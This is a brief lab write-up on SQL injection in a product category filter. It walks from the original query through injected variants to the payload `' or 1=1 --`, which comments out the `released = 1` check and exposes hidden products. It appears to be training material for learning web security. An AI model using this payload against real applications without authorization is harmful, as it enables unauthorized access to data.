## SQL Injection vulnerability in `WHERE` clause allowing retrieval of hidden data
- SQL Injection in `product` category filter.
- `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
- End goal - display all products both released and unreleased.
- Analysis:
  - ```sql 
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
    ```
  - ```sql 
    SELECT * FROM products WHERE category = ''' AND released = 1 
    ```
  - ```sql 
    SELECT * FROM products WHERE category = ''--' AND released = 1 
    ```
  - ```sql 
    SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 
    ```
  - The above query basically converted as follows - 
  - ```sql 
    SELECT * FROM products
    ```

